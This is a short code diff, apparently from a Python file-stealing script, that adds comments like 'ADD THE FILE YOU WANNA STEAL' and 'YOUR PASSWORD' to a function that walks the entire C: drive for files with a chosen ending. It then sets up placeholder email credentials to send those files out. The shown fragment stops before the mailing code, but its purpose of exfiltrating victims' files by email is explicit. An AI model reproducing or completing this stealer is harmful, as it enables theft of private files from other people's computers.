@@ -9,13 +9,18 @@ from email import encoders
 def fsf():
     for root, dirs, files in os.walk('C:\\'):
         for file in files:
+            # ADD THE FILE YOU WANNA STEAL
             if file.endswith('file u wanna steal'):
                 pis = os.path.join(root, file)
                 if pis == os.path.join(root, file):
                     pass
-                
+                # YOUR EMAIL
                 email_user = 'ur email'
+                
+                # YOUR PASSWORD
                 email_password = 'ur pass'
+                
+                # YOUR EMAIL
                 email_send = 'ur email'
                 subject = 'subject'
 
